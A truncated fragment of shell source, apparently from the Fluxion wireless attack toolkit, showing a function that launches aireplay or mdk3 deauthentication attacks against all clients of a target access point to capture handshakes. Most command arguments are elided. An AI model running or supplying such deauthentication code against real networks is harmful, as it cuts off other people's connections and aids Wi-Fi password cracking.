...
function handshake_snooper_start_deauthenticator() {
  ...
  # Start deauthenticators.  --deauth=100
  case "$HANDSHAKEDeauthenticatorIdentifier" in
  "$HandshakeSnooperAireplayMethodOption")
    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009"  -title "Deauthenticating [aireplay] all clients on $APTargetSSID" -e \
  ...
  "$HandshakeSnooperMdk3MethodOption")
    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating [mdk3] all clients on $APTargetSSID" -e \
